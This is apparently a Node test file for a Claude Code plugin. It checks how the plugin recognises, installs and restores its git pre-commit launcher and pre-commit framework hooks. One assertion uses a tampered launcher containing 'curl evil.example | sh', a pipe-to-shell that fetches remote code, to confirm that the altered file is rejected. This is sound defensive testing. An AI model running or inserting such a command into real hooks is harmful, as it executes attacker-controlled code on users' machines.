// v0.4.1 두 번째 검토(2026-11-16): .git/hooks 둘레의 적용·되돌리기, pre-commit 불러오기 글, Ansible 저장소의 인프라 지침.
//  - 우리 것은 「표시가 어디 있기만 하면」이 아니라 「우리 실행기 그대로」일 때만(지우기·바꾸기 모두)
//  - 되돌리기는 지운 것의 백업 사본 글을 그대로 되살리고, .legacy 는 되살리지 않고 알린다
//  - .legacy 는 pre-commit 의 훅이 있을 때만 지운다
//  - 불러오기 글은 실행 파일이 깨져도 통과, verbose 없음, 옛 항목이면 바꿔 넣으라고 알린다
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { tmpDir, gitInit, writeFiles, gitIn } from './helpers.mjs';
import { plan } from '../lib/plan.mjs';
import { apply, undo } from '../lib/apply-run.mjs';
import { loadAll, recommend } from '../lib/catalog.mjs';
import { ruleTexts } from '../lib/claude-md.mjs';
import { detect } from '../detect.mjs';
import { MARKER, launcherText, PLUGIN_DIR, PRE_COMMIT_LOADER, preCommitSnippet, preCommitPasted, isOurLauncher, isPreCommitFrameworkHook, gitHookActive } from '../../hooks/lib/git-hook.mjs';

const all = loadAll();
const sel = { lang: 'ko', combo: 'team', skills: [], hooks: ['secrets', 'protected-files'], rules: [], flow: 'github-flow', explore: [], note: '', share: false };
const HOOK = path.join('.git', 'hooks', 'pre-commit');
const LEGACY = `${HOOK}.legacy`;
const YAML = '.pre-commit-config.yaml';
const OTHER = 'repos:\n  - repo: https://github.com/psf/black\n    rev: 24.1.0\n    hooks:\n      - id: black\n';
const FRAMEWORK = '#!/usr/bin/env bash\n# File generated by pre-commit: https://pre-commit.com\n# ID: 138fd403232d2ddd5efb44317e38bf03\n\nINSTALL_PYTHON=/usr/bin/python3\nARGS=(hook-impl --config=.pre-commit-config.yaml --hook-type=pre-commit)\n';
let tmp;
let saved;
before(() => {
  tmp = tmpDir('harness-v041b-');
  saved = process.env.CLAUDE_PLUGIN_ROOT;
  process.env.CLAUDE_PLUGIN_ROOT = PLUGIN_DIR;
  process.env.SLASH_COMMAND_TOOL_CHAR_BUDGET = '100000000';
});
after(() => {
  delete process.env.SLASH_COMMAND_TOOL_CHAR_BUDGET;
  if (saved === undefined) delete process.env.CLAUDE_PLUGIN_ROOT;
  else process.env.CLAUDE_PLUGIN_ROOT = saved;
  fs.rmSync(tmp, { recursive: true, force: true });
});
let seq = 0;
const repo = (yaml = OTHER) => {
  const dir = path.join(tmp, `r${++seq}`);
  gitInit(dir, { branch: 'main' });
  if (yaml !== null) fs.writeFileSync(path.join(dir, YAML), yaml);
  return dir;
};
const textOf = (dir, rel) => (fs.existsSync(path.join(dir, rel)) ? fs.readFileSync(path.join(dir, rel), 'utf8') : null);
const removes = (dir) => plan(dir, sel, all, { active: true }).changes.filter((c) => c.kind === 'git-hook-remove').map((c) => path.relative(dir, c.path));

test('우리 실행기 알아보기: 경로만 다른 실행기·CRLF 는 우리 것, 표시를 적은 남의 훅·줄을 덧붙인 실행기는 아니다', () => {
  for (const p of [PLUGIN_DIR, path.join(tmp, "with space 'q'"), '/opt/x"y']) assert.ok(isOurLauncher(launcherText(p)), p);
  assert.ok(isOurLauncher(launcherText(PLUGIN_DIR).replace(/\n/g, '\r\n')));
  assert.ok(!isOurLauncher(`#!/bin/sh\n# migrated off ${MARKER}\nnpm run lint\n`));
  assert.ok(!isOurLauncher(`${launcherText(PLUGIN_DIR)}npm test\n`));
  assert.ok(!isOurLauncher(launcherText(PLUGIN_DIR).replace('exit 0', 'curl evil.example | sh')));
  assert.ok(!isOurLauncher(null) && !isOurLauncher(''));
  assert.ok(isPreCommitFrameworkHook(FRAMEWORK));
  assert.ok(!isPreCommitFrameworkHook('#!/bin/sh\n.git/hooks/pre-commit.legacy || exit 1\nnpm test\n'));
});

test('표시만 있는 남의 훅은 우리 것이 아니라 PreToolUse 커밋 검사를 끄지 않는다(gitHookActive)', () => {
  const dir = repo(null);
  fs.writeFileSync(path.join(dir, HOOK), `#!/bin/sh\n# ${MARKER} 는 예전 이야기\nnpm test\n`);
  assert.equal(gitHookActive(dir), false);
  fs.writeFileSync(path.join(dir, HOOK), launcherText(PLUGIN_DIR));
  assert.equal(gitHookActive(dir), true);
});

test('pre-commit 저장소: 표시를 주석에 적은 남의 훅은 지우지 않고 알리며, 되돌린 뒤에도 그대로다', async () => {
  const dir = repo();
  const user = `#!/bin/sh\n# migrated off ${MARKER}; this is our own lint hook now\nnpm run lint\n`;
  fs.writeFileSync(path.join(dir, HOOK), user);
  const p = plan(dir, sel, all, { active: true });
  assert.deepEqual(removes(dir), []);
  assert.ok(p.warnings.includes('git-hook-exists'), JSON.stringify(p.warnings));
  await apply(dir, sel);
  undo(dir);
  assert.equal(textOf(dir, HOOK), user);
});

test('pre-commit 저장소: 줄을 덧붙인 우리 실행기도 지우지 않는다(사용자 줄이 사라지던 일)', async () => {
  const dir = repo();
  const edited = `${launcherText(PLUGIN_DIR)}npm test\n`;
  fs.writeFileSync(path.join(dir, HOOK), edited);
  assert.deepEqual(removes(dir), []);
  await apply(dir, sel);
  assert.equal(textOf(dir, HOOK), edited);
  undo(dir);
  assert.equal(textOf(dir, HOOK), edited);
});

test('git 훅 저장소: 줄을 덧붙인 우리 실행기는 다시 쓰지 않고 알린다', () => {
  const dir = repo(null);
  fs.writeFileSync(path.join(dir, HOOK), `${launcherText(PLUGIN_DIR)}npm test\n`);
  const p = plan(dir, sel, all, { active: true });
  assert.ok(!p.changes.some((c) => c.kind === 'git-hook'));
  assert.ok(p.warnings.includes('git-hook-exists'));
});

test('되돌리기는 지운 실행기를 백업 사본 글 그대로 되살린다(적어 둔 옛 경로까지)', async () => {
  const dir = repo();
  const old = launcherText(path.join(tmp, 'old-plugin'));
  fs.writeFileSync(path.join(dir, HOOK), old);
  await apply(dir, sel);
  assert.equal(textOf(dir, HOOK), null);
  const u = undo(dir);
  assert.ok(u.restored.includes('.git/hooks/pre-commit'), JSON.stringify(u));
  assert.equal(textOf(dir, HOOK), old);
});

test('.legacy: pre-commit 의 훅이 있을 때만 지우고, 되돌리기는 되살리지 않고 notes 로 알린다', async () => {
  // 사용자가 직접 쓴 감싸는 훅이 .legacy 를 부르면 그대로 둔다
  const wrap = repo();
  fs.writeFileSync(path.join(wrap, HOOK), '#!/bin/sh\n.git/hooks/pre-commit.legacy || exit 1\nnpm test\n');
  fs.writeFileSync(path.join(wrap, LEGACY), launcherText(PLUGIN_DIR));
  assert.deepEqual(removes(wrap), []);
  // pre-commit 의 훅이면 지운다
  const dir = repo();
  fs.writeFileSync(path.join(dir, HOOK), FRAMEWORK);
  fs.writeFileSync(path.join(dir, LEGACY), launcherText(PLUGIN_DIR));
  assert.deepEqual(removes(dir), [LEGACY]);
  await apply(dir, sel);
  assert.equal(textOf(dir, LEGACY), null);
  const u = undo(dir);
  assert.deepEqual(u.notes, [{ path: '.git/hooks/pre-commit.legacy', reason: 'legacy-not-restored' }], JSON.stringify(u));
  assert.ok(!(u.restored || []).includes('.git/hooks/pre-commit.legacy'));
  assert.equal(textOf(dir, LEGACY), null, 'Windows 에서 모든 커밋을 막는 상태로 돌아가지 않는다');
  assert.equal(textOf(dir, HOOK), FRAMEWORK);
  // pre-commit 의 훅 + 남의 .legacy 는 그대로
  const own = repo();
  fs.writeFileSync(path.join(own, HOOK), FRAMEWORK);
  fs.writeFileSync(path.join(own, LEGACY), '#!/bin/sh\nmake lint\n');
  assert.deepEqual(removes(own), []);
});

test('불러오기 글: 실행 파일이 던지거나·문법이 틀리거나·폴더면 한 줄 알리고 0', () => {
  const args = JSON.parse(preCommitSnippet().match(/^\s+args: (\[.*\])$/m)[1]);
  assert.deepEqual(args, ['-e', PRE_COMMIT_LOADER]);
  const dir = tmpDir('harness-loader-broken-');
  try {
    const runner = path.join(dir, '.claude', 'harness-fit-pre-commit.mjs');
    fs.mkdirSync(path.dirname(runner));
    for (const [label, put] of [
      ['throw', () => fs.writeFileSync(runner, "throw new Error('boom');\n")],
      ['syntax', () => fs.writeFileSync(runner, 'export const x = ;\n')],
      ['dir', () => { fs.rmSync(runner, { force: true }); fs.mkdirSync(runner); }],
    ]) {
      put();
      const r = spawnSync(process.execPath, args, { cwd: dir, encoding: 'utf8' });
      assert.equal(r.status, 0, `${label}: ${r.stderr}`);
      assert.match(r.stdout, /harness-fit: \.claude\/harness-fit-pre-commit\.mjs failed, skipped/, label);
      assert.equal(r.stdout.trim().split('\n').length, 1, `${label}: 한 줄`);
      assert.ok(!/at |Error:/.test(r.stderr), `${label}: 스택이 찍힘 ${r.stderr}`);
    }
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('붙여 넣을 항목: verbose 없음, 지금 글 그대로면 단계를 숨기고, 옛 항목이면 바꿔 넣으라고 보인다', () => {
  assert.ok(!/verbose/.test(preCommitSnippet()));
  const current = `repos:\n${preCommitSnippet()}`;
  const outdated = current.replace(PRE_COMMIT_LOADER, "require('./.claude/harness-fit-pre-commit.mjs')");
  assert.equal(preCommitPasted(current), 'current');
  assert.equal(preCommitPasted(outdated), 'outdated');
  assert.equal(preCommitPasted(OTHER), null);
  assert.ok(!plan(repo(current), sel, all, { active: true }).manual.some((m) => m.kind === 'pre-commit'));
  const step = plan(repo(outdated), sel, all, { active: true }).manual.find((m) => m.kind === 'pre-commit');
  assert.equal(step?.replace, true, JSON.stringify(step));
  assert.equal(plan(repo(), sel, all, { active: true }).manual.find((m) => m.kind === 'pre-commit').replace, undefined);
});

test('Ansible 만 있는 저장소에도 인바운드 0.0.0.0/0·공개 버킷 줄이 들어간다(Terraform 줄은 빠진다)', () => {
  const d = gitInit(path.join(tmp, `ansible${++seq}`), { branch: 'main' });
  writeFiles(d, { 'ansible.cfg': '[defaults]\n', 'playbooks/sg.yml': '- hosts: all\n  tasks: []\n' });
  gitIn(d)('add', '-A');
  const det = detect(d);
  assert.ok(det.stack.includes('Ansible') && !det.stack.includes('Terraform'), det.stack.join(','));
  assert.ok(det.kinds.includes('ansible'), det.kinds.join(','));
  for (const [lang, open, fmt] of [['ko', '0.0.0.0/0', 'terraform fmt'], ['en', '0.0.0.0/0', 'terraform fmt']]) {
    const t = ruleTexts({ ...recommend(all, det, lang), lang }).iac;
    assert.ok(t && t.includes(open), `${lang}: 인바운드 줄 없음`);
    assert.ok(!t.includes(fmt), `${lang}: Terraform 줄이 들어감`);
  }
});
